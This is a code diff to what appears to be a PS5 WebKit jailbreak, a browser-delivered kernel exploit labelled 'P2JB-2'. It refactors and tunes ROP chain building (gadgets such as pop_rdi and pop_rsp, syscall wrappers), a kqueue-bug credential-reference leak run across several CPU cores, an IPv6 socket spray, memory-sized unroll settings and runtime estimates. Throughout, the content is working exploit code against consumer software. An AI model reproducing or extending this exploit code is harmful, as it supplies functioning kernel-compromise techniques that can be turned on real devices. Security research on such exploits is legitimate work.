@@ -130,21 +130,28 @@
         // Still 3x p2jb's original 64 and still ONE fireSync wake, which is what keeps the
         // free and the spray on the same core.
         const NUM_IPV6_SOCKETS = 192;
-        // P2JB-2 (default): autonomous counter-driven cr_ref leak — no pipes, no JS feed.
-        // Same kqueueex bug, stage0 rewritten as a self-driving kernel exploit.
-        // ?legacy=1 / ?pf=1: matem6 pipe-gated leak. ?cores=5: 5 workers @8192 unroll.
+        // P2JB-2 (default): autonomous counter leak, no pipes. 8192 unroll / 4 cores
+        // fits PS5 WebKit memory (~8 MB chains). ?turbo=1: 16384 unroll (OOM risk).
+        // ?legacy=1: pipe path. ?cores=5: fifth worker @8192 only with ?turbo=1.
         let MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
         let LEAK_CORES = [0, 1, 2, 3];
         const _legacy_pipe = /\blegacy=1\b/.test(location.search) || /\bpf=1\b/.test(location.search);
         const _pipe_feed_legacy = _legacy_pipe;
+        const _turbo_mem = /\bturbo=1\b/.test(location.search) || /\bunroll=16384\b/.test(location.search);
         const _want_5core = /\bcores=5\b/.test(location.search);
         const _use_prefill = !_legacy_pipe;
+        function planLeakUnroll() {
+            if (_legacy_pipe) return _pipe_feed_legacy ? 4096 : (_turbo_mem ? 16384 : 8192);
+            if (_turbo_mem && _want_5core) return 8192;
+            if (_turbo_mem) return 16384;
+            return 8192;
+        }
         (function planCores() {
             const a = window.P2JB_ALLOWED_CORES;
             if (!Array.isArray(a) || a.length < 3) return;
             MAIN_CORE = a[a.length - 1];
-            if (_want_5core && a.length >= 6)
+            if (_want_5core && _turbo_mem && a.length >= 6)
                 LEAK_CORES = a.slice(0, a.length - 1);
             else
                 LEAK_CORES = a.slice(0, a.length - 2);
@@ -158,7 +165,7 @@
         }
 
         // poops G_BRANCH: [counter]==imm → exit, else work.
-        function emit_branch_equal(emit, at, idx, branch_tbl, val_addr, cmp_imm, work_rsp, exit_rsp) {
+        function emit_branch_equal(emit, at, branch_tbl, val_addr, cmp_imm, work_rsp, exit_rsp) {
             write64(branch_tbl + 0n, work_rsp);
             write64(branch_tbl + 8n, exit_rsp);
             emit(ROP.pop_rcx); emit(val_addr);
@@ -170,14 +177,11 @@
             emit(ROP.pop_rcx); emit(branch_tbl);
             emit(ROP.add_rax_rcx);
             emit(ROP.mov_rax_indir);
-            const bptr_ptr_idx = idx;
-            emit(ROP.pop_rdi); emit(0n);
+            const bptr_ptr_idx = emit(ROP.pop_rdi); emit(0n);
             emit(ROP.mov_qword_rdi_rax);
             emit(ROP.pop_rsp);
-            const bptr_slot = idx;
-            emit(0n);
+            const bptr_slot = emit(0n);
             write64(at(bptr_ptr_idx + 1), at(bptr_slot));
-            return idx;
         }
 
         async function build_p2jb2_leak_chain(core, counter_addr, loops_target, finished_addr, unroll, remainder) {
@@ -186,6 +190,8 @@
             const EXIT_MARK = 0xDEADn;
             const BRANCH_SLOTS = 18;
             const STACK_SIZE = 0x4000 + (unroll * 27 + remainder * 6 + BRANCH_SLOTS + 0x400) * 8;
+            window.syncMark("P2JB2-CHAIN", "core=" + core + " unroll=" + unroll
+                + " stackMB=" + (STACK_SIZE / 1048576).toFixed(2));
             const buf = malloc(STACK_SIZE);
             for (let k = 0n; k < 0x4000n; k += 8n) write64(buf + k, 0n);
             const entry = buf + 0x4000n;
@@ -208,10 +214,9 @@
             emit(syscall_wrapper); emit(ROP.ret);
 
             const LOOP_START = idx;
-            const BRANCH_SLOTS = 18;
             const work_idx = idx + BRANCH_SLOTS;
             const exit_idx = work_idx + unroll * 21 + 8;
-            emit_branch_equal(emit, at, idx, branch_tbl, counter_addr, loops_target,
+            emit_branch_equal(emit, at, branch_tbl, counter_addr, loops_target,
                 at(work_idx), at(exit_idx));
 
             const kqBase = [];
@@ -277,6 +282,7 @@
                 await ulog("P2JB2-SPAWN-" + w + " loops=" + loops_w + " rem=" + remainder_w);
                 spawn_leak_worker(chain.entry);
                 workers.push({ chain, counter, finished, loops: loops_w, target: target_w });
+                await js_sleep(0);
             }
             const total_loops = workers.reduce((a, w) => a + w.loops, 0n);
             window.liveStatus("P2JB-2 autonomous leak\n" + NW + " workers, " + LEAK_UNROLL
@@ -1742,9 +1748,7 @@
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            const LEAK_UNROLL = _legacy_pipe
-                ? (_pipe_feed_legacy ? 4096 : (_want_5core ? 8192 : 16384))
-                : (_want_5core ? 8192 : 16384);
+            const LEAK_UNROLL = planLeakUnroll();
             const U = BigInt(LEAK_UNROLL);
             const FEED_CHUNK = _pipe_feed_legacy ? 4096 : 65536;
             const PIPE_ROOM = 57344n;
@@ -1752,10 +1756,12 @@
             const POLL_MS = 100;
             const leak_mode = _legacy_pipe
                 ? (_use_prefill ? "legacy-turbo" : "legacy-feed")
-                : (_want_5core ? "p2jb2-5" : "p2jb2");
+                : (_turbo_mem ? (_want_5core ? "p2jb2-turbo5" : "p2jb2-turbo")
+                    : "p2jb2");
             window.syncMark("LEAK-MODE", leak_mode + " unroll=" + LEAK_UNROLL
                 + " cores=" + LEAK_CORES.length
-                + (_legacy_pipe ? " pipe=1" : " autonomous=1"));
+                + (_legacy_pipe ? " pipe=1" : " autonomous=1")
+                + (_turbo_mem ? " turbo=1" : " memsafe=1"));
 
             const NW = LEAK_CORES.length;
 
@@ -4480,24 +4486,28 @@
                 case 4: eta_minutes = 50; break;
                 default: eta_minutes = Math.max(25, Math.round(50 * 4 / leak_nw)); break;
             }
-        } else if (_want_5core) {
+        } else if (_turbo_mem && _want_5core) {
             switch (leak_nw) {
-                case 5: eta_minutes = 34; break;
-                default: eta_minutes = Math.max(28, Math.round(34 * 5 / leak_nw)); break;
+                case 5: eta_minutes = 32; break;
+                default: eta_minutes = Math.max(28, Math.round(32 * 5 / leak_nw)); break;
+            }
+        } else if (_turbo_mem) {
+            switch (leak_nw) {
+                case 4: eta_minutes = 34; break;
+                default: eta_minutes = Math.max(28, Math.round(34 * 4 / leak_nw)); break;
             }
         } else {
             switch (leak_nw) {
                 case 1: eta_minutes = 90; break;
                 case 2: eta_minutes = 55; break;
-                case 3: eta_minutes = 42; break;
-                case 4: eta_minutes = 36; break;
-                default: eta_minutes = Math.max(28, Math.round(36 * 4 / leak_nw)); break;
+                case 3: eta_minutes = 44; break;
+                case 4: eta_minutes = 38; break;
+                default: eta_minutes = Math.max(30, Math.round(38 * 4 / leak_nw)); break;
             }
         }
         window.syncMark("LEAK-TUNE", "mode=" + (_legacy_pipe ? "legacy"
-            : (_want_5core ? "p2jb2-5" : "p2jb2"))
-            + " cores=" + leak_nw + " unroll="
-            + (_legacy_pipe && _pipe_feed_legacy ? 4096 : (_want_5core ? 8192 : 16384))
+            : (_turbo_mem ? (_want_5core ? "p2jb2-turbo5" : "p2jb2-turbo") : "p2jb2"))
+            + " cores=" + leak_nw + " unroll=" + planLeakUnroll()
             + " eta_min=" + eta_minutes);
         if (typeof window.liveStatus.configure === "function") {
             const leakSec = eta_minutes * 60;
